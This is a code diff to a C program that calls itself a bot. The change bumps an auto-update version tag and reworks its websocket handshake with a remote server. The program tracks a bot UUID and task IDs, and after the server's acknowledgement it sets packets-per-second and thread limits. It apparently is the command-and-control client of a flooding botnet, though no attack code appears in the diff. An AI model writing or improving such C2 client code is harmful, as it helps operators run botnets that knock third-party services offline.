@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.19"
+#define BOT_VERSION_TAG "v4.0.20"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -225,8 +225,7 @@ int main(int argc, char *argv[])
         int handshaked = 0;
         int hs_sent = 0;
 
-        /* Drain server "connected" frame first, THEN send handshake.
-         * Avoid SSL write while unread app data sits in the buffer. */
+        /* Drain server frames (connected), then send handshake, then wait for ack. */
         {
             char pre[4096];
             int pn = ws_recv(&ws, pre, sizeof(pre));
@@ -234,10 +233,12 @@ int main(int argc, char *argv[])
                 last_recv = time(NULL);
                 char t0[64] = {0};
                 json_str(pre, "type", t0, sizeof(t0));
-                if (foreground) fprintf(stderr, "[bot] pre-recv type=%s\n", t0[0] ? t0 : "?");
+                if (foreground)
+                    fprintf(stderr, "[bot] pre-recv type=%s len=%d\n", t0[0] ? t0 : "?", pn);
                 if (!strcmp(t0, "connected") || !strcmp(t0, "handshake_ack") ||
                     !strcmp(t0, "heartbeat_ack") || !strcmp(t0, "pong"))
-                    handshaked = 1;
+                    /* connected != full handshake yet */
+                    ;
             } else if (pn < 0) {
                 if (foreground) fprintf(stderr, "[bot] pre-recv hard error, reconnect\n");
                 ws_disconnect(&ws);
@@ -258,6 +259,46 @@ int main(int argc, char *argv[])
             pthread_mutex_destroy(&ws.io);
             sleep(cfg.reconnect_min);
             continue;
+        }
+
+        /* Wait for handshake_ack (or treat connected+any server msg as ok after send) */
+        {
+            int got_ack = 0;
+            for (int i = 0; i < 10 && !got_ack && !g_shutdown; i++) {
+                char abuf[4096];
+                int an = ws_recv(&ws, abuf, sizeof(abuf));
+                if (an > 0) {
+                    last_recv = time(NULL);
+                    char t1[64] = {0};
+                    json_str(abuf, "type", t1, sizeof(t1));
+                    if (foreground)
+                        fprintf(stderr, "[bot] post-hs recv type=%s\n", t1[0] ? t1 : "?");
+                    if (!strcmp(t1, "handshake_ack") || !strcmp(t1, "connected") ||
+                        !strcmp(t1, "heartbeat_ack") || !strcmp(t1, "pong")) {
+                        handshaked = 1;
+                        got_ack = 1;
+                        if (!strcmp(t1, "handshake_ack")) {
+                            int pps = json_int(abuf, "max_pps");
+                            int th = json_int(abuf, "max_threads");
+                            if (pps > 0) cfg.default_pps = (unsigned)pps;
+                            if (th > 0) cfg.default_threads = (unsigned)th;
+                        }
+                    } else if (!strcmp(t1, "error")) {
+                        if (foreground) fprintf(stderr, "[bot] server error: %s\n", abuf);
+                    }
+                } else if (an < 0) {
+                    if (foreground) fprintf(stderr, "[bot] post-hs hard error\n");
+                    break;
+                }
+            }
+            if (!got_ack) {
+                if (foreground) fprintf(stderr, "[bot] no handshake_ack, reconnect\n");
+                ws_disconnect(&ws);
+                pthread_mutex_destroy(&ws.io);
+                sleep(cfg.reconnect_min);
+                continue;
+            }
+            if (foreground) fprintf(stderr, "[bot] session ready\n");
         }
 
         while (!g_shutdown)
